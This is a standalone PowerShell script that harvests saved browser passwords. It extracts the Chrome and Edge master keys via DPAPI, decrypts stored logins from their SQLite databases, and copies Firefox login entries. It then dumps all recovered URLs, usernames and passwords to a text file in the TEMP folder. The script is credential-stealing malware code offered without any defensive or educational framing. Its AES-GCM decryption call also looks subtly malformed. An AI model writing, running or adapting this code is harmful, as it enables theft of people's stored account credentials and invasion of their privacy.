# Function to decrypt Chrome passwords
function Get-ChromePasswords {
    $localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
    $localState = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
    $key = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key) | Select-Object -Skip 5
    $key = [System.Security.Cryptography.ProtectedData]::Unprotect($key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    
    $dbPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
    $dbConnection.Open()
    $cmd = $dbConnection.CreateCommand()
    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
    $reader = $cmd.ExecuteReader()

    $passwords = @()
    while ($reader.Read()) {
        $url = $reader["origin_url"]
        $username = $reader["username_value"]
        $encryptedPassword = $reader["password_value"]
        $iv = $encryptedPassword[3..14]
        $payload = $encryptedPassword[15..($encryptedPassword.Length - 1)]
        $cipher = [System.Security.Cryptography.AesGcm]::new($key)
        $password = [System.Text.Encoding]::UTF8.GetString($cipher.Decrypt([byte[]]$iv, [byte[]]$payload, $null, $null))
        $passwords += [pscustomobject]@{URL = $url; Username = $username; Password = $password}
    }
    $dbConnection.Close()
    return $passwords
}

# Function to extract Firefox passwords
function Get-FirefoxPasswords {
    $profilesPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    $passwords = @()

    foreach ($profile in Get-ChildItem -Path $profilesPath) {
        $loginsJsonPath = "$profilesPath\$profile\logins.json"
        if (Test-Path $loginsJsonPath) {
            $loginsJson = Get-Content -Path $loginsJsonPath -Raw | ConvertFrom-Json
            foreach ($login in $loginsJson.logins) {
                $passwords += [pscustomobject]@{
                    URL = $login.hostname
                    Username = $login.encryptedUsername
                    Password = $login.encryptedPassword
                }
            }
        }
    }
    return $passwords
}

# Function to extract Edge passwords
function Get-EdgePasswords {
    $localStatePath = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Local State"
    $localState = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
    $key = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key) | Select-Object -Skip 5
    $key = [System.Security.Cryptography.ProtectedData]::Unprotect($key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    
    $dbPath = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
    $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
    $dbConnection.Open()
    $cmd = $dbConnection.CreateCommand()
    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
    $reader = $cmd.ExecuteReader()

    $passwords = @()
    while ($reader.Read()) {
        $url = $reader["origin_url"]
        $username = $reader["username_value"]
        $encryptedPassword = $reader["password_value"]
        $iv = $encryptedPassword[3..14]
        $payload = $encryptedPassword[15..($encryptedPassword.Length - 1)]
        $cipher = [System.Security.Cryptography.AesGcm]::new($key)
        $password = [System.Text.Encoding]::UTF8.GetString($cipher.Decrypt([byte[]]$iv, [byte[]]$payload, $null, $null))
        $passwords += [pscustomobject]@{URL = $url; Username = $username; Password = $password}
    }
    $dbConnection.Close()
    return $passwords
}

# Combine results and save to file
$chromePasswords = Get-ChromePasswords
$firefoxPasswords = Get-FirefoxPasswords
$edgePasswords = Get-EdgePasswords

$outputPath = "$env:TEMP\browser_passwords.txt"
$chromePasswords | Out-File -FilePath $outputPath -Append
$firefoxPasswords | Out-File -FilePath $outputPath -Append
$edgePasswords | Out-File -FilePath $outputPath -Append
